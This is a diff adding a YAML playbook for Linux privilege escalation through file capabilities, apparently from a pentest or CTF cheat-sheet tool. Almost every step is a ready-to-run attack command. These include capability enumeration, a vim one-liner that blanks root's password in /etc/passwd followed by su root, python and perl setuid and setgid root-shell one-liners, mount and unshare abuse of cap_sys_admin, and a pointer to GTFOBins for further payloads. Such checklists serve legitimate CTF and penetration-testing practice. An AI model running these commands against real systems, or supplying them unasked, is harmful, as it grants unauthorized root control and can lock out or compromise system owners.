@@ -1,0 +1,266 @@
+name: Linux Capabilities Privilege Escalation
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE CAPABILITIES
+# =========================================================
+- title: Enumerate Capabilities
+  mode: enum
+  info: |
+    Enumerate binaries with Linux capabilities assigned.
+
+  entries:
+
+    - cmd: "find / -type f -exec getcap {} \\; 2>/dev/null"
+      info: enumerate all capabilities
+
+    - cmd: "getcap -r / 2>/dev/null"
+      info: recursive capability scan
+
+    - cmd: "find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\; 2>/dev/null"
+      info: common binary locations
+
+    - cmd: "grep Cap /proc/self/status"
+      info: current process capabilities
+
+  look_for:
+    - cap_setuid
+    - cap_setgid
+    - cap_dac_override
+    - cap_sys_admin
+    - cap_sys_ptrace
+    - cap_sys_chroot
+
+  notes:
+    - capabilities may allow privilege escalation without sudo
+    - capabilities are similar to partial root privileges
+    - focus on dangerous binaries like:
+      - vim
+      - python
+      - perl
+      - tar
+      - openssl
+
+
+# =========================================================
+# [2] IDENTIFY DANGEROUS CAPABILITIES
+# =========================================================
+- title: Dangerous Capabilities
+  mode: enum
+  info: |
+    Identify capabilities commonly abused for privesc.
+
+  entries:
+
+    - cmd: "getcap /usr/bin/vim.basic"
+      info: vim capability check
+
+    - cmd: "getcap /usr/bin/python3"
+      info: python capability check
+
+    - cmd: "getcap /usr/bin/perl"
+      info: perl capability check
+
+    - cmd: "getcap /usr/bin/tar"
+      info: tar capability check
+
+  look_for:
+    - cap_dac_override
+    - cap_setuid
+    - cap_setgid
+    - cap_sys_admin
+
+  notes:
+    - cap_dac_override bypasses file permissions
+    - cap_setuid may allow root shell
+    - cap_sys_admin is effectively root in many cases
+
+
+# =========================================================
+# [3] CAP_DAC_OVERRIDE ABUSE
+# =========================================================
+- title: cap_dac_override Abuse
+  mode: chain
+  info: |
+    Bypass file permission checks and modify protected files.
+
+  entries:
+
+    - cmd: "getcap /usr/bin/vim.basic"
+      info: verify capability
+
+    - cmd: "cat /etc/passwd | head -n1"
+      info: inspect root entry
+
+    - cmd: "/usr/bin/vim.basic /etc/passwd"
+      info: edit passwd interactively
+
+    - cmd: "echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd"
+      info: remove root password
+
+    - cmd: "su root"
+      info: login as root
+
+  look_for:
+    - "cap_dac_override=eip"
+    - writable protected files
+    - root entry modified
+
+  notes:
+    - removing x from root line removes password requirement
+    - works because capability bypasses DAC permissions
+    - restore passwd file after CTF if needed
+
+
+# =========================================================
+# [4] CAP_SETUID ABUSE
+# =========================================================
+- title: cap_setuid Abuse
+  mode: enum
+  info: |
+    Gain root by changing effective UID.
+
+  entries:
+
+    - cmd: "getcap -r / 2>/dev/null | grep cap_setuid"
+      info: find cap_setuid binaries
+
+    - cmd: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+      info: python setuid shell
+
+    - cmd: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+      info: perl setuid shell
+
+  look_for:
+    - cap_setuid+ep
+    - root shell
+    - euid=0
+
+  notes:
+    - capability allows changing effective UID
+    - works best with scripting languages
+
+
+# =========================================================
+# [5] CAP_SETGID ABUSE
+# =========================================================
+- title: cap_setgid Abuse
+  mode: enum
+  info: |
+    Change effective group privileges.
+
+  entries:
+
+    - cmd: "getcap -r / 2>/dev/null | grep cap_setgid"
+      info: enumerate setgid capabilities
+
+    - cmd: "python3 -c 'import os; os.setgid(0); os.system(\"/bin/sh\")'"
+      info: python setgid shell
+
+  look_for:
+    - cap_setgid+ep
+    - gid=0
+
+  notes:
+    - less powerful than setuid alone
+    - may help access protected group resources
+
+
+# =========================================================
+# [6] CAP_SYS_ADMIN ABUSE
+# =========================================================
+- title: cap_sys_admin Abuse
+  mode: enum
+  info: |
+    Abuse administrative capabilities.
+
+  entries:
+
+    - cmd: "getcap -r / 2>/dev/null | grep cap_sys_admin"
+      info: enumerate sys_admin binaries
+
+    - cmd: "mount -o bind /bin/sh /bin/mount"
+      info: possible mount abuse
+
+    - cmd: "unshare --mount /bin/sh"
+      info: namespace abuse
+
+  look_for:
+    - cap_sys_admin+ep
+    - mount permissions
+    - namespace creation
+
+  notes:
+    - cap_sys_admin is extremely dangerous
+    - often considered equivalent to root
+    - may allow:
+      - mounts
+      - namespaces
+      - device access
+
+
+# =========================================================
+# [7] GTFOBins CHECK
+# =========================================================
+- title: GTFOBins Capability Abuse
+  mode: enum
+  info: |
+    Cross-reference capable binaries with GTFOBins.
+
+  entries:
+
+    - cmd: "getcap -r / 2>/dev/null"
+      info: enumerate capabilities
+
+    - cmd: "https://gtfobins.github.io/"
+      info: lookup exploitation techniques
+
+  look_for:
+    - vim
+    - python
+    - perl
+    - tar
+    - openssl
+    - find
+
+  notes:
+    - many binaries support:
+      - SUID abuse
+      - capabilities abuse
+      - sudo abuse
+    - check GTFOBins for exact payloads
+
+
+# =========================================================
+# [8] FULL WORKFLOW
+# =========================================================
+- title: Capability Privesc Workflow
+  mode: chain
+  info: |
+    Generic Linux capability escalation workflow.
+
+  entries:
+
+    - cmd: "getcap -r / 2>/dev/null"
+      info: enumerate capabilities
+
+    - cmd: "getcap /usr/bin/vim.basic"
+      info: inspect interesting binary
+
+    - cmd: "echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd"
+      info: abuse cap_dac_override
+
+    - cmd: "su root"
+      info: obtain root shell
+
+  look_for:
+    - dangerous capabilities
+    - writable protected files
+    - root access
+
+  notes:
+    - enumerate first
+    - identify dangerous capabilities
+    - map binary to exploitation primitive
+    - GTFOBins is extremely useful here
